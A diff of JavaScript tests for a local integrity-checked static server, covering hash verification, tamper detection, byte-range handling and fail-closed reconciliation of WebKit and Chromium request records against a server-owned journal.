+  assert.throws(() => trustedServer.validateTrustedStaticRequest(url, "http://127.0.0.1:4173", expectedFiles), expected);
+});
+
+test("F2-GOV-09 trusted server serves verified local i18n without redirect and detects later tampering", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-server-"));
+  const bytes = Buffer.from('{"ok":true}');
+  await write(directory, "src/i18n/pt.json", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "src/i18n/pt.json", sha256: sha256ForTest(bytes) }], 0);
+  try {
+    const response = await fetch(`${server.origin}/src/i18n/pt.json?cache=busted`, { redirect: "manual" });
+    assert.equal(response.status, 200);
+    assert.equal(response.redirected, false);
+    assert.deepEqual(await response.json(), { ok: true });
+    await writeFile(join(directory, "src", "i18n", "pt.json"), '{"ok":false}');
+    const tampered = await fetch(`${server.origin}/src/i18n/pt.json`, { redirect: "manual" });
+    assert.equal(tampered.status, 404);
+    assert.match(await tampered.text(), /changed after materialization/i);
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F11 serves a verified local byte range without accepting indeterminate browser status", async () => {
+  assert.equal(typeof trustedConsumer.assertTrustedLocalResponseStatus, "function", "trusted local response status guard is absent");
+  assert.doesNotThrow(() => trustedConsumer.assertTrustedLocalResponseStatus(200, "http://127.0.0.1/full"));
+  assert.doesNotThrow(() => trustedConsumer.assertTrustedLocalResponseStatus(206, "http://127.0.0.1/range"));
+  assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(0, "http://127.0.0.1/indeterminate"), /status 0/i);
+  assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(404, "http://127.0.0.1/missing"), /status 404/i);
+
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f11-range-"));
+  const bytes = Buffer.from(Array.from({ length: 32 }, (_, index) => index));
+  await write(directory, "media/fixture.webm", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "media/fixture.webm", sha256: sha256ForTest(bytes) }], 0);
+  try {
+    const response = await fetch(`${server.origin}/media/fixture.webm`, { headers: { range: "bytes=4-11" }, redirect: "manual" });
+    assert.equal(response.status, 206);
+    assert.equal(response.headers.get("accept-ranges"), "bytes");
+    assert.equal(response.headers.get("content-range"), "bytes 4-11/32");
+    assert.equal(response.headers.get("content-length"), "8");
+    assert.deepEqual(Buffer.from(await response.arrayBuffer()), bytes.subarray(4, 12));
+    assert.deepEqual(server.getRequestLog().filter(({ route }) => route === "media/fixture.webm").map(({ range, status, bytes, finished }) => ({ range, status, bytes, finished })), [
+      { range: "bytes=4-11", status: 206, bytes: 8, finished: true },
+    ]);
+
+    const invalid = await fetch(`${server.origin}/media/fixture.webm`, { headers: { range: "bytes=99-100" }, redirect: "manual" });
+    assert.equal(invalid.status, 416);
+    assert.match(await invalid.text(), /range/i);
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F11 WebKit records browser media variability without promoting status zero", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f11-webkit-"));
+  const htmlBytes = Buffer.from('<!doctype html><video id="media" preload="metadata" src="/media/fixture.webm"></video>');
+  const mediaBytes = workingFile("src/img/crm-demo.webm");
+  await write(directory, "index.html", htmlBytes);
+  await write(directory, "media/fixture.webm", mediaBytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [
+    { path: "index.html", sha256: sha256ForTest(htmlBytes) },
+    { path: "media/fixture.webm", sha256: sha256ForTest(mediaBytes) },
+  ], 0);
+  const { webkit } = await import("playwright");
+  const browser = await webkit.launch({ headless: true });
+  try {
+    const context = await browser.newContext();
+    const responses = [];
+    const failures = [];
+    context.on("response", (response) => {
+      if (response.url().endsWith("/media/fixture.webm")) responses.push(response.status());
+    });
+    context.on("requestfailed", (request) => {
+      if (request.url().endsWith("/media/fixture.webm")) failures.push(request.failure()?.errorText ?? "unknown");
+    });
+    await context.route("**", (route) => route.continue());
+    const page = await context.newPage();
+    await page.goto(`${server.origin}/index.html`, { waitUntil: "load" });
+    await page.waitForTimeout(750);
+    const mediaState = await page.locator("#media").evaluate((media) => ({ readyState: media.readyState, networkState: media.networkState, errorCode: media.error?.code ?? null }));
+    for (const status of responses) {
+      if (status === 0) assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(status, `${server.origin}/media/fixture.webm`), /status 0/i);
+      else assert.doesNotThrow(() => trustedConsumer.assertTrustedLocalResponseStatus(status, `${server.origin}/media/fixture.webm`));
+    }
+    assert.ok(failures.every((reason) => reason === "Load request cancelled"), `unexpected WebKit media failure: ${failures.join(", ")}`);
+    assert.ok(Number.isInteger(mediaState.readyState) && Number.isInteger(mediaState.networkState), "WebKit media state is malformed");
+    const records = server.getRequestLog().filter(({ route }) => route === "media/fixture.webm");
+    assert.ok(records.length > 0, "trusted server did not observe the WebKit media request");
+    assert.ok(records.every(({ status, bytes, finished }) => [200, 206].includes(status) && bytes > 0 && finished), "trusted server did not complete every verified WebKit media response");
+    await context.close();
+  } finally {
+    await browser.close();
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F11-F1 rejects every unproven local request failure and accepts only the exact completed WebKit range", () => {
+  assert.equal(typeof trustedConsumer.assertTrustedLocalFailureCorrelations, "function", "operational local failure correlator is absent");
+  const requestId = "1".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const failure = { requestId, url, route: "media/fixture.webm", range: "bytes=0-", reason: "Load request cancelled" };
+  const journalId = "a".repeat(64);
+  const response = { requestId, url, route: "media/fixture.webm", range: "bytes=0-", status: 206, journalId };
+  const journal = { sequence: 4, journalId, requestId, url: "/media/fixture.webm", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-", rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  const accept = (overrides = {}) => trustedConsumer.assertTrustedLocalFailureCorrelations({
+    engine: "webkit",
+    failures: [failure],
+    responses: [response],
+    journal: [journal],
+    journalWindow: { start: 4, end: 4 },
+    ...overrides,
+  });
+  assert.doesNotThrow(() => accept());
+  assert.throws(() => accept({ responses: [] }), /response.*absent|response cardinality/i);
+  assert.throws(() => accept({ journal: [] }), /journal.*absent|journal cardinality/i);
+  assert.throws(() => accept({ journal: [{ ...journal, finished: false }] }), /journal.*incomplete|finished/i);
+  assert.throws(() => accept({ journal: [{ ...journal, absoluteUrl: `${url}?forged=1` }] }), /URL.*divergent/i);
+  assert.throws(() => accept({ journal: [{ ...journal, route: "media/other.webm" }] }), /route.*divergent/i);
+  assert.throws(() => accept({ journal: [{ ...journal, range: "bytes=1-" }] }), /range.*divergent/i);
+  assert.throws(() => accept({ journal: [journal, { ...journal }] }), /journal.*cardinality|duplicated/i);
+  assert.throws(() => accept({ journalWindow: { start: 5, end: 9 } }), /journal.*window|journal.*absent/i);
+  assert.throws(() => accept({ failures: [{ ...failure, reason: "net::ERR_FAILED" }] }), /failure reason|cancel/i);
+  assert.throws(() => accept({ responses: [{ ...response, status: 0 }] }), /status 0/i);
+});
+
+test("F2-GOV-09-F14 exposes the observed requestfailed reason before classifying a cancellation", () => {
+  const requestId = "f".repeat(64);
+  const journalId = "e".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const route = "media/fixture.webm";
+  const range = "bytes=0-";
+  const response = { requestId, url, route, range, status: 206, journalId };
+  const journal = { sequence: 0, journalId, requestId, absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  assert.throws(
+    () => trustedConsumer.assertTrustedLocalFailureCorrelations({
+      engine: "chromium",
+      failures: [{ requestId, url, route, range, reason: "F14_DIAGNOSTIC_REASON" }],
+      responses: [response],
+      journal: [journal],
+      journalWindow: { start: 0, end: 0 },
+    }),
+    /F14_DIAGNOSTIC_REASON/,
+    "the fail-closed diagnostic must expose the actual requestfailed reason before any reason can be authorized",
+  );
+});
+
+test("F2-GOV-09-F14 accepts the measured Chromium cancellation only through complete server-owned proof", () => {
+  const requestId = "1".repeat(64);
+  const journalId = "a".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const route = "media/fixture.webm";
+  const range = "bytes=0-";
+  const failure = { requestId, url, route, range, reason: "net::ERR_ABORTED" };
+  const response = { requestId, url, route, range, status: 206, journalId };
+  const journal = { sequence: 4, journalId, requestId, absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedLocalFailureCorrelations({
+    engine: "chromium",
+    failures: [failure],
+    responses: [response],
+    journal: [journal],
+    journalWindow: { start: 4, end: 4 },
+    ...overrides,
+  });
+  assert.doesNotThrow(() => verify(), "the measured Chromium cancellation must be classified by structural proof rather than engine name");
+  assert.throws(() => verify({ failures: [{ ...failure, reason: "net::ERR_FAILED" }] }), /reason.*not.*authorized|cancellation.*reason/i);
+  assert.throws(() => verify({ failures: [{ ...failure, reason: "UNKNOWN_LOCAL_REQUEST_FAILURE" }] }), /reason.*not.*authorized|cancellation.*reason/i);
+  assert.throws(() => verify({ responses: [] }), /response.*cardinality/i);
+  assert.throws(() => verify({ responses: [{ ...response, status: 0, journalId: null }] }), /status 0/i);
+  assert.throws(() => verify({ responses: [{ ...response, status: 200 }] }), /status.*divergent/i);
+  assert.throws(() => verify({ journal: [] }), /journal.*cardinality/i);
+  assert.throws(() => verify({ journal: [journal, { ...journal }] }), /journal.*cardinality/i);
+  assert.throws(() => verify({ journal: [{ ...journal, journalId: "b".repeat(64) }] }), /journal.*cardinality/i);
+  assert.throws(() => verify({ journal: [{ ...journal, requestId: "2".repeat(64) }] }), /identity.*divergent/i);
+  assert.throws(() => verify({ journal: [{ ...journal, absoluteUrl: `${url}?forged=1` }] }), /URL.*divergent/i);
+  assert.throws(() => verify({ journal: [{ ...journal, route: "media/other.webm" }] }), /route.*divergent/i);
+  assert.throws(() => verify({ journal: [{ ...journal, range: "bytes=1-" }] }), /range.*divergent/i);
+  assert.throws(() => verify({ journal: [{ ...journal, status: 200 }] }), /status.*divergent/i);
+  assert.throws(() => verify({ journal: [{ ...journal, finished: false }] }), /incomplete/i);
+  assert.throws(() => verify({ journalWindow: { start: 5, end: 5 } }), /outside.*window/i);
+});
+
+test("F2-GOV-09-F14 binds a WebKit response without Playwright identity only through its unique server journal", () => {
+  const windowId = "window-f14-journal-only";
+  const requestId = "2".repeat(64);
+  const journalId = "b".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const route = "media/fixture.webm";
+  const range = "bytes=0-";
+  const request = { requestId, url, route, range, resourceType: "media" };
+  const observation = { requestId: null, url, route, range, status: 206, journalId, resourceType: "media" };
+  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
+    engine: "webkit",
+    windowId,
+    localRequests: [request],
+    localResponses: [observation],
+    localFailures: [],
+    journal: [record],
+    journalRejections: [],
+    ...overrides,
+  });
+  assert.equal(verify().trustedResponses, 1, "the server journal must remain the sole identity authority");
+  assert.throws(() => verify({ localResponses: [{ ...observation, journalId: null }] }), /journal identity.*absent|malformed/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, journalId: "c".repeat(64) }] }), /no bound journal|journal.*record|binding/i);
+  assert.throws(() => verify({ localResponses: [observation, { ...observation }] }), /journal identity is duplicated|cardinality/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, requestId: "3".repeat(64) }] }), /unknown request identity/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, url: `${url}?forged=1` }] }), /URL.*divergent/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, route: "media/other.webm" }] }), /route.*divergent/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, range: "bytes=1-" }] }), /range.*divergent/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, status: 200 }] }), /status.*divergent/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, status: 0 }] }), /status 0|indeterminate.*journal/i);
+  assert.throws(() => verify({ localResponses: [{ ...observation, requestId, status: 0, journalId: null }] }), /status 0/i, "status zero must remain invalid even when Playwright supplies a known request identity");
+  assert.throws(() => verify({ journal: [{ ...record, requestId: null }] }), /extra|unattributed|identity.*absent/i);
+  assert.throws(() => verify({ journal: [{ ...record, finished: false }] }), /incomplete/i);
+  assert.throws(() => verify({ journal: [record, { ...record, sequence: 1, journalId: "d".repeat(64) }] }), /cardinality|duplicated|extra/i);
+});
+
+test("F2-GOV-09-F14 mutation controls keep cancellation reason and server journal binding load-bearing", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const assertGuards = (source) => {
+    assert.match(source, /TRUSTED_LOCAL_CANCELLATION_REASONS\.has\(failure\.reason\)/);
+    assert.equal([...source.matchAll(/TRUSTED_LOCAL_CANCELLATION_REASONS\.has\(failure\.reason\)/g)].length, 2, "both cancellation-reason boundaries must remain closed");
+    assert.doesNotMatch(source, /assert\.equal\(engine,\s*["']webkit["']/);
+    assert.match(source, /validObservationByJournal\.get\(record\.journalId\)/);
+    assert.match(source, /observation\.requestId !== null/);
+    assert.match(source, /trusted local response journal identity is absent or malformed/);
+    assert.match(source, /response\.status === 0/);
+    assert.match(source, /collection\.seal\(fingerprint\)/);
+    assert.match(source, /boundRequestByJournal\.has\(record\.journalId\)/);
+  };
+  assert.doesNotThrow(() => assertGuards(consumer));
+  for (const [label, pattern, replacement] of [
+    ["accept any reason", 'assert.ok(TRUSTED_LOCAL_CANCELLATION_REASONS.has(failure.reason), `${engine}: local request failure reason ${JSON.stringify(failure.reason ?? null)} is not an authorized cancellation`);', 'assert.ok(true, `${engine}: local request failure reason ${JSON.stringify(failure.reason ?? null)} is not an authorized cancellation`);'],
+    ["reinstate engine gate", 'assert.ok(TRUSTED_LOCAL_CANCELLATION_REASONS.has(failure.reason), `${engine}: local request failure reason ${JSON.stringify(failure.reason ?? null)} is not an authorized cancellation`);', 'assert.ok(engine === "webkit", `${engine}: local request failure reason ${JSON.stringify(failure.reason ?? null)} is not an authorized cancellation`);'],
+    ["trust browser request identity", "validObservationByJournal.get(record.journalId)", "validObservationByRequest.get(record.requestId)"],
+    ["accept observation without journal", 'assert.match(response.journalId ?? "", /^[0-9a-f]{64}$/, `${engine}: trusted local response journal identity is absent or malformed`);', ""],
+    ["promote status zero", "response.status === 0", "false"],
+    ["remove seal", "collection.seal(fingerprint)", "void fingerprint"],
+    ["relax journal cardinality", "boundRequestByJournal.has(record.journalId)", "false"],
+  ]) {
+    const mutated = consumer.replace(pattern, replacement);
+    assert.notEqual(mutated, consumer, `${label} mutation did not alter bytes`);
+    assert.throws(() => assertGuards(mutated), /input did not match|match the regular expression|both cancellation-reason boundaries/i, `${label} mutation escaped`);
+  }
+});
+
+test("F2-GOV-09-F18 wires WebKit internals into the disjoint server-owned universe", async () => {
+  assert.equal(typeof trustedConsumer.installRuntimeNetworkPolicy, "function", "operational runtime policy is not reviewable");
+  assert.match(workingFile("scripts/governance/f2-gov-08-consumer.mjs").toString("utf8"), /quarantinedStatusZero\.push\(\{ universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null,/, "the trusted consumer must own the authority fields of every quarantined status-zero observation");
+  assert.match(workingFile("scripts/governance/f2-gov-08-consumer.mjs").toString("utf8"), /resourceType: serverOwnedResourceTypeForRoute\(quarantineRoute, engine\)/, "status-zero resourceType must come from the canonical server-owned route classifier");
+  assert.doesNotMatch(workingFile("scripts/governance/f2-gov-08-consumer.mjs").toString("utf8"), /quarantinedStatusZero\.push\([^\n]+resourceType: response\.request\(\)\.resourceType\(\)/, "status-zero resourceType must not trust browser variability");
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f11-f1-webkit-"));
+  const htmlBytes = Buffer.from('<!doctype html><video id="media" preload="metadata" src="/media/fixture.webm"></video>');
+  const mediaBytes = workingFile("src/img/crm-demo.webm");
+  await write(directory, "index.html", htmlBytes);
+  await write(directory, "media/fixture.webm", mediaBytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [
+    { path: "index.html", sha256: sha256ForTest(htmlBytes) },
+    { path: "media/fixture.webm", sha256: sha256ForTest(mediaBytes) },
+  ], 0);
+  const { webkit } = await import("playwright");
+  const browser = await webkit.launch({ headless: true });
+  try {
+    const context = await browser.newContext();
+    const policy = await trustedConsumer.installRuntimeNetworkPolicy(context, server, "webkit", "candidate-flow");
+    const continuationCookies = await context.cookies(server.origin);
+    assert.deepEqual(continuationCookies.map(({ name, httpOnly }) => ({ name, httpOnly })), [
+      { name: "branct_trusted_continuation", httpOnly: true },
+    ], "the server-owned continuation capability must be installed before WebKit traffic");
+    const page = await context.newPage();
+    await page.goto(`${server.origin}/index.html`, { waitUntil: "load" });
+    await page.waitForTimeout(750);
+    policy.setScope({ phase: "quiescence", action: "drain-page", route: null, viewport: null });
+    await page.goto("about:blank", { waitUntil: "load" });
+    const correlation = await policy.finalizeLocalFailureCorrelations();
+    await page.close();
+    await context.close();
+    policy.assertStillVerified();
+    assert.equal(correlation.correlatedFailures, 0);
+    assert.equal(policy.localFailures.length, 0);
+    assert.equal(policy.localResponses.some(({ status }) => status === 0), false, "status zero must never be accepted or emitted as trusted evidence");
+    const serverInternals = server.getRequestLog().filter(({ universe }) => universe === "SERVER_INTERNAL");
+    assert.ok(serverInternals.every(({ authorized, identityOwner, requestId, journalId, status, bytes, finished }) => authorized === true && identityOwner === "server" && /^[0-9a-f]{64}$/.test(requestId) && /^[0-9a-f]{64}$/.test(journalId) && [200, 206].includes(status) && bytes > 0 && finished === true), "a WebKit internal request escaped the exact server-owned proof contract");
+    assert.equal(correlation.serverInternal, serverInternals.length, "every headerless WebKit internal must remain counted only in the server-owned universe");
+    const refusedInternals = server.getRequestLog().filter(({ authorized }) => authorized === false);
+    assert.ok(refusedInternals.every(({ bytes, finished, status }) => bytes === 0 && finished === true && status === 403));
+    assert.equal(correlation.refusedInternalRequests, refusedInternals.length, "every capability refusal must remain counted separately from both proof universes");
+  } finally {
+    await browser.close();
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F12 collection lifecycle rejects events during and after sealing", () => {
+  assert.equal(typeof trustedConsumer.createTrustedCollectionLifecycle, "function", "trusted collection lifecycle is absent");
+  const lifecycle = trustedConsumer.createTrustedCollectionLifecycle("webkit candidate-flow");
+  assert.equal(lifecycle.snapshot().state, "OPEN");
+  lifecycle.recordEvent("request");
+  lifecycle.beginQuiescence();
+  assert.equal(lifecycle.snapshot().state, "QUIESCING");
+  const first = lifecycle.observeQuiescence("journal:1/events:1");
+  lifecycle.recordEvent("requestfailed");
+  const changed = lifecycle.observeQuiescence("journal:2/events:2");
+  assert.equal(first.stableSamples, 1);
+  assert.equal(changed.stableSamples, 1, "an event during quiescence must reset stability");
+  lifecycle.seal("journal:2/events:2");
+  assert.equal(lifecycle.snapshot().state, "SEALED");
+  assert.throws(() => lifecycle.recordEvent("late-requestfailed"), /after.*seal|sealed|late/i);
+  assert.equal(lifecycle.snapshot().state, "REJECTED");
+
+  const finalized = trustedConsumer.createTrustedCollectionLifecycle("webkit finalized");
+  finalized.beginQuiescence();
+  finalized.observeQuiescence("stable");
+  finalized.seal("stable");
+  finalized.verify("stable");
+  assert.equal(finalized.snapshot().state, "VERIFIED");
+  assert.throws(() => finalized.recordEvent("immediately-after-finalize"), /after.*seal|verified|late/i);
+  assert.equal(finalized.snapshot().state, "REJECTED");
+});
+
+test("F2-GOV-09-F12 enforces a closed server-owned journal bijection", () => {
+  assert.equal(typeof trustedConsumer.assertTrustedJournalBijection, "function", "closed trusted journal verifier is absent");
+  const windowId = "window-1";
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const requestId = "1".repeat(64);
+  const internalRequestId = "2".repeat(64);
+  const boundJournalId = "a".repeat(64);
+  const internalJournalId = "b".repeat(64);
+  const localRequest = { requestId, url, route: "media/fixture.webm", range: "bytes=0-31" };
+  const internalRequest = { requestId: internalRequestId, url, route: "media/fixture.webm", range: "bytes=0-" };
+  const localResponse = { ...localRequest, status: 206, journalId: boundJournalId };
+  const internalResponse = { ...internalRequest, status: 206, journalId: internalJournalId };
+  const failure = { ...localRequest, reason: "Load request cancelled", journalId: boundJournalId };
+  const bound = { sequence: 4, windowId, journalId: boundJournalId, requestId, method: "GET", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-31", rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  const internal = { sequence: 3, windowId, journalId: internalJournalId, requestId: internalRequestId, method: "GET", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-", rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
+    engine: "webkit",
+    windowId,
+    localRequests: [localRequest, internalRequest],
+    localResponses: [localResponse, internalResponse],
+    localFailures: [failure],
+    journal: [internal, bound],
+    ...overrides,
+  });
+  assert.doesNotThrow(() => verify(), "server journal media records with an explicit request identity must remain attributable");
+  assert.doesNotThrow(() => verify({ journal: [bound, internal] }), "journal verification must be order-independent");
+  assert.throws(() => verify({ journal: [{ ...internal, requestId: null }, bound] }), /extra|unattributed|identity.*absent/i, "browser evidence must not supply an identity absent from the server journal");
+  assert.throws(() => verify({ journal: [...verifyJournal(), { ...internal, sequence: 5, journalId: "c".repeat(64) }] }), /extra|bijection|unattributed|cardinality|binding is duplicated/i, "an extra internal record for the same resource must not escape the closed bijection");
+  assert.throws(() => verify({ localResponses: [{ ...localResponse, journalId: undefined }, internalResponse] }), /journal identity.*absent|malformed|bijection/i, "a response without its server-owned journal identity must fail closed");
+  assert.throws(() => verify({ localResponses: [{ ...localResponse, journalId: "not-a-journal-id" }, internalResponse] }), /journal identity.*absent|malformed/i);
+  assert.throws(() => verify({ localResponses: [localResponse, { ...internalResponse, journalId: boundJournalId }] }), /journal identity is duplicated|cardinality/i);
+  assert.throws(() => verify({ localResponses: [{ ...localResponse, journalId: internalJournalId }, { ...internalResponse, journalId: boundJournalId }] }), /URL is divergent|range is divergent|request identity is divergent/i, "journal identities transplanted between valid responses must fail closed");
+  assert.throws(() => verify({ journal: [...verifyJournal(), { ...internal, sequence: 5, journalId: "c".repeat(64), absoluteUrl: "http://127.0.0.1:4173/unknown.bin", route: "unknown.bin", status: 404 }] }), /extra|unknown|unattributed|status|binding is duplicated/i);
+  assert.throws(() => verify({ journal: [...verifyJournal(), { ...internal, sequence: 5, journalId: "d".repeat(64), requestId: "2".repeat(64) }] }), /unknown.*request|unattributed|cardinality|binding is duplicated/i);
+  assert.throws(() => verify({ journal: [internal, bound, { ...bound, sequence: 5 }] }), /journal.*duplicated|journal.*identity/i);
+  assert.throws(() => verify({ journal: [internal] }), /failure.*journal|bound.*absent|bijection|no bound journal|cardinality/i);
+  assert.throws(() => verify({ localFailures: [{ ...failure, requestId: "2".repeat(64) }] }), /failure.*request|identity|bijection/i);
+  assert.throws(() => verify({ journal: [{ ...internal, windowId: "other-window" }, bound] }), /window.*divergent/i);
+
+  function verifyJournal() { return [internal, bound]; }
+});
+
+test("F2-GOV-09-F13 derives a missing browser response from exactly one completed server-owned record", () => {
+  const windowId = "window-f13-missing-response";
+  const requestId = "1".repeat(64);
+  const journalId = "a".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const request = { requestId, url, route: "media/fixture.webm", range: "bytes=0-31", resourceType: "media" };
+  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: request.range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
+  const result = trustedConsumer.assertTrustedJournalBijection({
+    engine: "chromium",
+    windowId,
+    localRequests: [request],
+    localResponses: [],
+    localFailures: [],
+    journal: [record],
+    journalRejections: [],
+  });
+  assert.equal(result.boundRequests, 1);
+  assert.equal(result.trustedResponses, 1);
+  assert.equal(result.indeterminateBrowserResponses, 0);
+});
+
+test("F2-GOV-09-F13 never promotes status zero while reconciling the CI 0/200 observation vector", () => {
+  const windowId = "window-f13-zero-two-hundred";
+  const requestId = "2".repeat(64);
+  const journalId = "b".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const request = { requestId, url, route: "media/fixture.webm", range: null, resourceType: "media" };
+  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
+  assert.throws(() => trustedConsumer.assertTrustedJournalBijection({
+    engine: "webkit",
+    windowId,
+    localRequests: [request],
+    localResponses: [
+      { ...request, status: 0, journalId: null },
+      { ...request, status: 200, journalId },
+    ],
+    localFailures: [],
+    journal: [record],
+    journalRejections: [],
+  }), /status 0/i);
+  assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(0, url), /status 0/i);
+});
+
+test("F2-GOV-09-F13 attributes a headerless internal media refusal to one server-owned rejection identity", () => {
+  const windowId = "window-f13-internal-refusal";
+  const rejectionId = "c".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const rejection = { sequence: 0, windowId, rejectionId, requestId: null, method: "GET", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-", status: 403, bytes: 0, finished: true, authorized: false };
+  const result = trustedConsumer.assertTrustedJournalBijection({
+    engine: "webkit",
+    windowId,
+    localRequests: [],
+    localResponses: [{ requestId: null, rejectionId, url, route: rejection.route, range: rejection.range, status: 403, resourceType: "media" }],
+    localFailures: [],
+    journal: [],
+    journalRejections: [rejection],
+  });
+  assert.equal(result.refusedInternalRequests, 1);
+  assert.equal(result.trustedResponses, 0);
+});
+
+test("F2-GOV-09-F13 keeps identity, cardinality and sealing fail-closed under adversarial ordering", () => {
+  const windowId = "window-f13-adversarial";
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const requestA = { requestId: "1".repeat(64), url, route: "media/fixture.webm", range: "bytes=0-15", resourceType: "media" };
+  const requestB = { requestId: "2".repeat(64), url, route: "media/fixture.webm", range: "bytes=16-31", resourceType: "media" };
+  const recordA = { sequence: 0, windowId, journalId: "a".repeat(64), requestId: requestA.requestId, method: "GET", absoluteUrl: url, route: requestA.route, range: requestA.range, rangeStart: 0, rangeEnd: 15, totalBytes: 32, status: 206, bytes: 16, finished: true };
+  const recordB = { sequence: 1, windowId, journalId: "b".repeat(64), requestId: requestB.requestId, method: "GET", absoluteUrl: url, route: requestB.route, range: requestB.range, rangeStart: 16, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 16, finished: true };
+  const observationA = { ...requestA, status: 206, journalId: recordA.journalId };
+  const observationB = { ...requestB, status: 206, journalId: recordB.journalId };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
+    engine: "chromium",
+    windowId,
+    localRequests: [requestA, requestB],
+    localResponses: [observationA, observationB],
+    localFailures: [],
+    journal: [recordA, recordB],
+    journalRejections: [],
+    ...overrides,
+  });
+  assert.equal(verify({ localRequests: [requestB, requestA], localResponses: [observationB, observationA], journal: [recordB, recordA] }).trustedResponses, 2, "the closed bijection must be order-independent");
+  assert.throws(() => verify({ journal: [recordA, { ...recordB, requestId: requestA.requestId }] }), /cardinality|divergent|binding is duplicated/i, "duplicate request binding must fail");
+  assert.throws(() => verify({ localResponses: [observationA, { ...observationA }] }), /cardinality|duplicated/i, "duplicate browser observation must fail");
+  assert.throws(() => verify({ localResponses: [{ ...observationA, status: 0, journalId: null }], journal: [recordB] }), /status 0/i, "status zero without its exact completed record must fail");
+  assert.throws(() => verify({ localRequests: [{ ...requestA, requestId: null }, requestB] }), /request identity is absent/i);
+  assert.throws(() => verify({ journal: [{ ...recordA, requestId: requestB.requestId }, recordB] }), /cardinality|binding is duplicated|URL.*divergent|range.*divergent/i, "a swapped identity must fail");
+  assert.throws(() => verify({ journal: [{ ...recordA, absoluteUrl: `${url}?forged=1` }, recordB] }), /URL.*divergent/i);
+  assert.throws(() => verify({ journal: [{ ...recordA, range: "bytes=1-15" }, recordB] }), /range.*divergent/i);
+  assert.throws(() => verify({ journal: [recordA, recordB, { ...recordA, sequence: 2, journalId: "c".repeat(64), requestId: null }] }), /extra|unattributed|cardinality/i, "an extra journal record must fail");
+
+  const rejection = { sequence: 2, windowId, rejectionId: "d".repeat(64), requestId: null, method: "GET", absoluteUrl: url, route: requestA.route, range: "bytes=0-", status: 403, bytes: 0, finished: true, authorized: false };
+  const refusal = { requestId: null, rejectionId: rejection.rejectionId, url, route: rejection.route, range: rejection.range, status: 403, resourceType: "media" };
+  assert.throws(() => verify({ journalRejections: [{ ...rejection, rejectionId: null }], localResponses: [observationA, observationB, refusal] }), /refusal identity is absent|malformed/i);
+  assert.throws(() => verify({ journalRejections: [rejection, { ...rejection }], localResponses: [observationA, observationB, refusal] }), /refusal identity is duplicated/i);
+  assert.throws(() => verify({ journalRejections: [rejection], localResponses: [observationA, observationB, { ...refusal, rejectionId: "e".repeat(64) }] }), /no server-owned rejection record/i);
+
+  const lifecycle = trustedConsumer.createTrustedCollectionLifecycle("F13 late event");
+  lifecycle.beginQuiescence();
+  lifecycle.observeQuiescence("stable");
+  lifecycle.seal("stable");
+  assert.throws(() => lifecycle.recordEvent("late-response"), /late event after seal/i);
+});
+
